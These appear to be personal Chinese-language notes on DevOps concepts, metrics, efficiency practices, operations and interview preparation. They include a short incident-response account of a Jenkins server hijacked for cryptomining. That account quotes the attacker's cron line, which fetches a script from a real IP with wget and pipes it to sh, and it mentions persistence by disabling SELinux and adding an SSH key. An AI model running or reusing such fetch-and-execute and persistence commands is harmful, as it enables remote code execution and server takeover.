### Main components for knowledge

**DevOps 几个关键因素**

1)工作流程自动化、标准化问题，如何让业务、产品、技术三种角色高效和有效地协同;
2)资产管理问题。如何有效的管理代码、文档、应用、资源等关键资产;
3)透明化与数字化问题。如何通过全局的信息透明促进协同，并通过数据洞察为 团队改进指明方向。

* 目标对齐
* 人员和文化
* 流程和平台
* 技术

**DevOps的关注点**

* 工具平台研发：工具链和顶层设计
* 流程实践落地
* 技术预研

**DevOps能力**

* 软实力
 - 沟通能力
 - 同理心
 - 学习能力

* 硬实力
 - 代码能力
 - 跨职能领域核心能力
 - DevOps核心理念和思维


**DevOps内核**

* 持续、快速、高质量交付有价值的

* IT 技术交付和运行的效率，成为决定数字化转型成败的关键，而 DevOps 要解决的问题正在于此。
 - 第一:交付内容上，从以信息为中心到关注完整的业务链路
 - 第二:交付过程上, 从聚焦技术交付，到优化端到端的过程。

 DevOps 的实施构建在云原生的基础设施之上，并以一站式的 DevOps 工具平台为支撑。通过 DevOps 实施，构建以下两个能力:
 第一，持续地顺畅高质量交付有效价值。持续优化协作模式和工程体系，消除业务需求交付过程中的一切 阻碍和等待，让交付节奏跟上业务发展的需要，同时保障交付的质量和交付效能的可持续性。
 第二，极致弹性和韧性的系统运行。IT 系统必须满足业务运营的要求，具备极致的弹性和韧性。弹性是指 它随业务负载自动、实时的扩缩容，以精准的弹性和合理地成本满足业务;韧性指的是确保系统安全、合规和 稳定的运行，实现系统运行的连续可用性和安全稳定。


* 顺畅、高质量地持续交付有效价值的闭环
 - 顺畅：价值的流动过程必须顺畅，没有阻碍
 - 高质量：如果质量不行，流动越快，死的也会越快
 - 持续：不能时断时续，小步快跑才是正道，不要憋大招
 - 有效价值：这是从需求层面来说的，你的交付物是不是真正解决了用户的本质问题。（关于本质问题我想多说一句，女生减肥不是本质问题，女生爱美才是，可以自己体会一下。）
 - 闭环：强调快速反馈的重要性

 *持续开发，持续集成，持续测试，持续交付和持续运维*


**价值主张**
1)业务驱动的协作模式; 2)产品导向的交付模式;3)特性为核心的持续交付;4)应用为核心的运维。

**度量指标**

* 交付效率
 - 需求前置时间
 - 开发前置时间

* 交付能力
 - 发布频率
 - 发布前置时间
 - 交付吞吐量

* 交付质量
 - 线上故障密度
 - 故障分布
 - 故障修复时常


* 流动速度，长期质量，客户价值以及数据驱动四个维度来对研发效能进行有效的度量。


**用于评估DevOps成功的几个KPI是什么？**
答 ：关键绩效指标是关键绩效指标的一种合同形式。为了衡量DevOps流程的成功，可以使用几个KPI。一些最受欢迎的是：

应用性能
应用程序的使用和流量
自动测试通过率
可用性
改变音量
客户票
缺陷逃逸率
部署频率
部署时间
错误率
部署失败
交货时间
检测时间（MTTD）
平均恢复时间（MTTR）

**提升效率**
```
工具选择，IDE： codespaces
增量编译
git flow
自动化CICD
发布策略
```

**问题**
公司对我这个职位的期望是什么？
这个职位未来几年的职业发展是怎样的？
为了胜任这个岗位我还需要学习哪些技术知识？
刚才问的那个技术问题某个细节我还不太明白，能解释下吗？



* 可以通过All-in-one的开发环境降低每位开发人员开发环境准备的时间成本，同时又能保证开发环境的一致性。更高级的玩法是使用云端IDE，实现只要有浏览器就能改代码。
* 可以借助基于AI的代码提示插件，大幅度提升IDE中代码的开发效率。同样输入一段代码，不借助AI代码提示插件，需要敲击键盘200次，启用插件可能只需要50次键盘敲击。
* 代码的静态检查没有必要等到代码递交后由CI中的Sonar流程来发起，那个时候发现问题再修复为时已晚，完全可以通过Sonar Lint插件结合IDE实时发起本地的代码检查，有问题直接在IDE中提示，直接修复。
* 单元测试比较耗费时间，可以借助EvoSuite之类的工具降低单元测试的开发工作量。
* 对于规模较大的项目，每次修改后编译时间比较长。可以采用增量编译，甚至是分布式编译（Distcc和CCache）提升效率。
* 前端开发可以借助JRebel和Nodemon之类的工具使前端开发预览的体验更流畅。
* 选择适合项目的代码分支策略对提升效率也大有帮助。
* 构建高度自动化的CI和CD流水线将大幅提升价值的流转速率。
* 选择合适的发布策略也会对效能和风险之间的平衡起到积极的作用。比如架构相对简单，但是集群规模庞大，优选金丝雀，如果架构比较复杂，但是集群规模不是太大，可能蓝绿发布更占优势。


**研发效能提升**
* 从痛点入手
```
本地编译耗时长：提供增量编译和分布式编译能力
本地测试困难，测试环境准备复杂且耗时：基于K8S的Pod提供一键搭建测试环境的能力
自动化测试用例数量大，执行回归时间过长：采用并发测试用例执行机制，使用几百几千台测试执行机并行执行用例，实现用硬件资源换时间
自动化测试用例维护成本高：测试用例采用模块化和分层体系，实现低成本的自动化用例维护
测试数据准备困难：引入统一测试数据服务（Test Data Service）能力
研发后期阶段，代码递交集中，缺陷井喷：推行测试左移，鼓励研发自测，推行”谁开发，谁测试，谁上线，谁Oncall“
性能缺陷在研发后期发现，修复重测成本高居不下：从性能测试转变为性能工程，让性能融入软件研发的各个环节，而不是最后的一锤子买卖
安全问题频现：将安全测试能力纳入研发的全生命周期，实现DevSecOps，而不是早期的SDL
集群规模庞大，发布过程耗时过长：各个层级的并发部署能力，集群内节点的并发，集群间的并发等
项目的过程数据都是后期集中填充，失去度量意义：项目过程数据由工具自动填充，不再依赖工程师手工输入。比如开发完成时间不再依赖于开发人员手工填写，而是由Jenkins构建完成后自动填写，以保证所有过程数据的真实有效性，从而为后面的度量和改进提供可靠的信息输入。
```

* 第二条是“从全局切入“。很多时候我们会尝试去优化某个具体的环节，而忽略了全局优化的可能。
* 第三条是“用户获益“。对于研效提升，有一点我们必须牢记，那就是成功的标准不是研发效能平台的成功，而是客户成功。
```
伪需求：伪需求是指研效团队自己臆想出来的，是属于典型的“手里拿着锤子，看什么都像钉子”的典型案例。那么如何识别伪需求呢？识别标准其实很简单，就看客户是不是愿意和你分摊成本，如果业务线已经开始做了，或者想要开始做，那就说明那是业务线的刚需，如果研效平台能帮助提供方案，那研效平台的接入就是水到渠成的事情。我就见到过很多这类刚需的例子，比如微服务架构下集成测试环境的搭建就是其中的典型。

结构问题：著名商业顾问刘润说过“结构不对，什么都不对“。比如两个和尚分粥的故事想必大家都听过，一碗粥两个和尚要均分，但是分粥的和尚总想多喝点粥，那怎么才能做到无监管情况下的公平呢？教育分粥的和尚说出家人“以少吃为怀”吗，显然一旦没有了监管，他就会给自己多分点，解决这个问题的最好办法就是一个和尚分粥，另一个和尚选粥，那么这个体制就决定了分粥的均匀性。所以好的策略是承认每个人都是自私的，但是你的策略能够在人人都是自私的基础上获得全局利益的最大化，如果你的全局利益最大化是建立在要求每个人都是大公无私的，那就是失败的设计，因为这必然会导致失败。回到研效提升这个问题上，我们必须抱着”不是我们的研效平台有多好，而是业务线用了以后有什么提升“来定位自己，才能从结构上获得成功的筹码。

服务意识：理解了上面的观点，理解服务意识就很自然了。在研效平台落地过程中我们需要和业务线互助实现双赢，业务线收获现成可用的方案，研效平台收获最佳实践的沉淀，这些最佳实践的沉淀是至关重要的，为后期的批量成功复制提供了技术基础。

另外还有一个小经验可以和大家分享，有时候为了让研效平台尽快能够在业务线落地，让业务线愿意成为我们的研效平台的试验田，我们有时还必须能承担起主动背锅的义务
```

* 持续改进



**最差实践**

* Sonar设而不卡
* PR形式化
* 监控设置但未处理


#### 困难的事情

**服务器被用作挖矿**

* NewRelic收到告警，linux jenkins-slave服务器当前CPU 100%
* 登上去，top命令看，看不到占用高的进程
* ps H -eo user,pid,ppid,tid,time,%cpu,cmd --sort=%cpu 看是否有隐藏进程
* 查看资料，安装htop
* 看到进程为12345的PID占用了大量的CPU
* kill -9 杀掉进程之后，一会又重启，应该是有定时任务
* ls -lrt -d /etc/cron* 查看任务配置， crontab -l 查看得到每分钟执行的任务，* * * * * wget -q -O - http://195.3.146.118/spr.sh | sh > /dev/null 2>&1
 -  文件关闭selinux，将自己ssh公钥加入authrized——key当中
* 注释定时任务
* systemctl 查找进程，杀掉进程，lsof -c 进程 查找文件，删除文件


**Transit VPC**

https://www.infoq.cn/article/dxqbeltzuwpacbxqlj69



**云效平台**

Jira，Confluence，Github，Artifactory，Jenkins，CICD，在线IDE，dashboard

产品，开发，测试，交付

云效是针对服务端开发的企业级一站式 DevOps 平台，提供从“需求->开发->测试->发布->运维->运营”端到端的协同服务和研发工具支撑，支持公共云、专有云和混合云的协同研发，致力于成为数字企业的研发效能引擎，助力企业产品快速创新迭代和研发效能升级。








#### 应用生命周期
* 应用创建阶段： 这个阶段，最重要的工作，是确认应用的基础信息和与基础服务的关系，要同时固化下来，
从应用创建之初，就将应用与各类基础服务的生命周期进行挂钩。另外一个很重要的工作，就是要开启与应用相关的各类基础服务的生命周期。比如这个应用需要用到缓存、消息队列和 DB 等，也可能需要域名 DNS 服务、VIP 配置等，这些
就要从应用创建这个动作延伸出去，启动这些关联基础服务的创建，比如需要缓存就去申请容量空间，需要消息队列要申请创建新的 Topic 等等。

* 应用的研发阶段： 应用的研发阶段主要是业务逻辑实现和验证的阶段。针对业务逻辑层面的场景就是开发代码
和质量保证，但是这个过程中就会涉及到代码的提交合并、编译打包以及在不同环境下的发
布部署过程。同时，开发和测试在不同的环境下进行各种类型的测试，比如单元测试、集成
测试以及系统测试等等，这整个过程就是我们常说的持续集成。

* 应用的上线阶段： 这是个过渡阶段，从应用创建过渡到线上运行。

* 应用的运行阶段： 这是应用生命周期中最重要、最核心的阶段。这个阶段，应用最重要的属性就是应用本身以及相关联的基础服务的各项运行指标。这里，我们就需要制定每个运维对象的 SLI、SLO 和 SLA，同时要建设能够对这些指标进行
监控和报警的监控体系。

* 应用的销毁阶段



#### 标准化关键运维对象
* 基础设施： 服务器，网络设备，硬件（机房，机架）
* 应用层面： 应用信息，代码，部署，脚本，日志


#### CMDB: Configuration Management Database    配置管理


#### 运维的价值呈现角度
* 运维基础平台体系的建设： 这块主要包括我们前面提到的标准化体系以及 CMDB、应用配置管理、DNS 域名管理、资源管理等偏向运维自身体系的建设。这一部分是运维的基础和核心，我们前面讲到的标准化以及应用体系建设都属于这个范畴。

* 分布式中间件的服务化建设： 在整个技术架构体系中，分布式中间件基础服务这一块起到了支撑作用。这一部分的标准化和服务化非常关键，特别是基于开源产品的二次开发或自研的中间件产品，更需要有对应的标准化和服务化建设。

* 持续交付体系建设： 持续交付体系是拉通运维和业务开发的关键纽带，是提升整个研发团队效率的关键部分。这个部分是整个软件或应用的生命周期的管理体系，包括从应用创建、研发阶段的持续集成，上线阶段的持续部署发布，再到线上运行阶段的各类资源服务扩容缩容等。

* 稳定性体系建设： 软件系统线上的稳定性保障，包括如何快速发现线上问题、如何快速定位问题、如何快速从故障中恢复业务、如何有效评估系统容量等等。

* 技术运维体系建设




HR面试

换工作原因
发展方向
稳定性
薪资
